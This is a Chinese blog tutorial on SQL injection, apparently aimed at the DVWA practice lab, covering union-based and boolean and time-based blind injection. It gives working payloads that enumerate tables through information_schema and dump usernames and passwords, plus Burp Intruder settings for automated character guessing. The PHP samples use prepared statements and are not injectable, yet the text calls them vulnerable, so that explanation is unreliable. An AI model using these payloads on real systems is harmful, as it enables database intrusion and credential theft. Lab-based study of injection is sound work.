---
layout: post
title: SQL注入详解
categories: 网络安全
description: SQL注入详解
keywords: SQL注入详解
---

SQL注入的几种方式详解

### 1、union联合注入原理

联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。

假设服务端代码如下

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

可以看出获取`id`之后直接拼接进入了SQL语句中，此处会有sql注入漏洞。

确定了有漏洞然后就可以根据思路去猜字段，可以通过`order by`来猜有几个字段，两个表的字段要数要相同，不然会出现报错。

```sql
SELECT * FROM `users` WHERE user_id = 1 order by 8 
```

猜到了有几个字段可以进行以下查询

```sql
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,7,8 
# 可以在数字的位置替换成函数
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,database(),user()
# 如果不想显示user_id=1的数据，可以修改成-1或者NULL，就只显示后面的内容了
SELECT * FROM `users` WHERE user_id = -1 union select 1,2,3,4,5,6,database(),user()
# 有很多条结果的时候可以加 limit 来限制
```

#### 1.1 联合查询注入获取敏感信息

当确定了可以进行SQL注入的时候，可以通过一些内置函数来获取数据库的信息

```sql
SELECT * FROM `guestbook` WHERE user_id = -1 union select 1,database(),user();
```

#### 1.2 联合查询注入通过 information_schema 获取表

在黑盒的情况下是不知道当前库有什么表的，可以通过 mysql 自带的information_schema 查询当前库的表。查询当前库的表 `limit 1` 相当于 `limit 1,1 `表示显示第一个 1 改成 2 就是第二个如此类推

```sql
# 有请求连接如下，已知可以字符注入 /sqli/?id=1&Submit=Submit

# 构造语句 获取当前位置的第一个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1) --+&Submit=Submit#

# 获取第二个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1 ) --+&Submit=Submit#

# 获取字段，可以通过修改limit 获取不同的字段
((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1))

# 查到字段之后，读取表内的内容
/sqli/?id=-1' union select 1,(select group_concat(user,0x3a,password) from users) --+&Submit=Submit#
```

### 2、boolean  布尔型盲注入

有服务端代码如下

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

根据代码可以看出来，虽然有sql注入漏洞，但是没有返回具体的数据库的信息，只返回了两种状态，这种叫`盲注入`

盲注入分为两种：

1. 布尔型盲注入
2. 延时注入

#### 2.1 判断盲注入

入 SQL 注入检测语句 判断页面是否不一样，如果不一样大概会存在 SQL 注入漏洞` 1'and '1'='1 `一样，` 1'and '1'='2` 不一样，如果输入检测语句页面没有任何改变可以使用延时语句进行检测 `1'and sleep(10)--+ `通过这两个检测方法的判断，可以确定存在 SQL 注入漏洞。

普通盲注入判断：

```txt
# 有以下两个注入语句
/sqli_blind/?id=1' and 1=1 -- &Submit=Submit#    #返回User ID exists in the database.
/sqli_blind/?id=1' and 1=2 -- &Submit=Submit#    #返回User ID is MISSING from the database.
```

延时注入判断：

```txt
sqli_blind/?id=1' and sleep(2) -- &Submit=Submit#
```

#### 2.2 布尔型注入

布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面，但是可以通过构造 SQL 语句，获取数据。

布尔型盲注入用到得 SQL 语句 select if(1=1,1,0)，if()函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示 1，否则显示 0。1=1 表达式可以换成构造的 SQL 攻击语句。

```txt
# 构建url
sqli_blind/?id=1' and if(3>2,1,0) -- 
```

#### 2.3 布尔型盲注入获取敏感信息

在黑盒的环境下，通过构造 SQL 注入语句，根据页面的特征确定获取敏感信息。

布尔型盲注入用到的函数`SUBSTRING()`：字符串截取，第一个参数是字符串，第二个参数是开始截取 第三个是截取的长度。

select database()查询当前库。

盲注入获取库名流程：

1. 用 if 函数进行构造 select if(SUBSTRING(database(),1,1)='d',1,0) 判断数据库第一个字是不是字符 d，如果是返回 1 否则返回 0 。
2. 接着判断第二个字符。将 substring 第二个参数写成 2 因为要截取第二个字符
   select if(SUBSTRING(database(),2,1)='v',1,0) 第二个字符为 v。如此类推。再后拼接字符就是完整的库名

很多时候是黑盒模式，不知道库名，也不知道啥的，我们就要首先判断注入，判断完注入就获取数据库的长度，得到长度再查询库名，通过库名再查询表，接着通过表查询字段，最后查询某表指定的数据。

#### 2.4 布尔型盲注入查询长度

要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。

构造注入语句

```txt
# 盲猜数据库名的长度是4，判断输出是1还是0进行确认长度，可能需要多次尝试才可以试出来
sqli_blind/?id=1' and if(length(database())=4,1,0)--+&Submit=Submit#
```

知道了库名的长度是4，截取每个字符再进行判断

```txt
# 截取字符判断
1' and if(substring(database(),1,1)='a',1,0)--+
1' and if(substring(database(),1,1)='d',1,0)--+

1' and if(substring(database(),2,1)='v',1,0)--+
...
#... 疯狂尝试
```

每次截取的值都要与这些字符`0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_`对比，进行判断，最后得到库名。

手动注入这么多次累死了，可以配合burp suite进行抓包检测

burp suite进行sql注入流程：

1. 抓到数据包发送到intruder
2. 清除掉所有变量之后，添加变量，如下：`?id=1%27%20and%20if(substring(database(),§1§,1)=%27§v§%27,1,0)--+&Submit=Submit`，选择`attack type=cluster bomb`
3. 第一个变量知道长度是4，所以设置`payload type=Numbers`,设置`payload options[Numbers]`的number range为1~4，每次递增1，`number format`设置为`Hex`
4. 第二个变量就是上面的那一串字符串，可以通过`add from list`选择`a-z/A-Z/0-9`最后再把`.@_`依次添加进去，MySQL大小写不敏感，可以不添加大写的`A-Z`
5. 执行攻击，通过状态`200`的排序查看，可以获得以下数据`4:a/1:d/2:v/3:w`，通过`1-4`的顺序，组合出库名为`dvwa`
